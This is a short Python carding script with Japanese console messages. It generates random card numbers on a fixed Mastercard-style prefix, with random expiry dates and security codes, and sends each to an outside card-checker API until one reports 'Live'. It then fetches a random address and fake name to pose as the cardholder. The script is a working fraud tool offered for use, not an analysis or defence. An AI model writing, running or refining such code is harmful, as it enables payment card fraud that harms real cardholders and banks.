import requests
import random
import time

print("カードを作っています")

api_url = "https://www.mrchecker.net/card-checker/ccn2/api.php"

while True:
    random_numbers = ''.join(random.choice('0123456789') for _ in range(9))
    random_month = random.randint(3, 8)
    random_year = random.randint(2023, 2028)

    data = f"5538902{random_numbers}|{random_month:02d}|{random_year}|{random_numbers[:3]}"

    response = requests.post(api_url, data=f"data:{data}")
    
    if "Live" in response.text:
        print("↑カード完成！")
        print(f"data: {data}")
        break

address_api_url = "https://www.doogal.co.uk/CreateRandomAddress/?startWith="
address_response = requests.get(address_api_url)
address_data = address_response.text.strip()

print("↑カード所有者の住所や！")
print(address_data)

name_api_url = "https://api.namefake.com/"
name_response = requests.get(name_api_url)
name_data = name_response.json()["name"]

print(name_data)
print("↑これがカード所有者の名前や！")
input("エンターを押して終了")
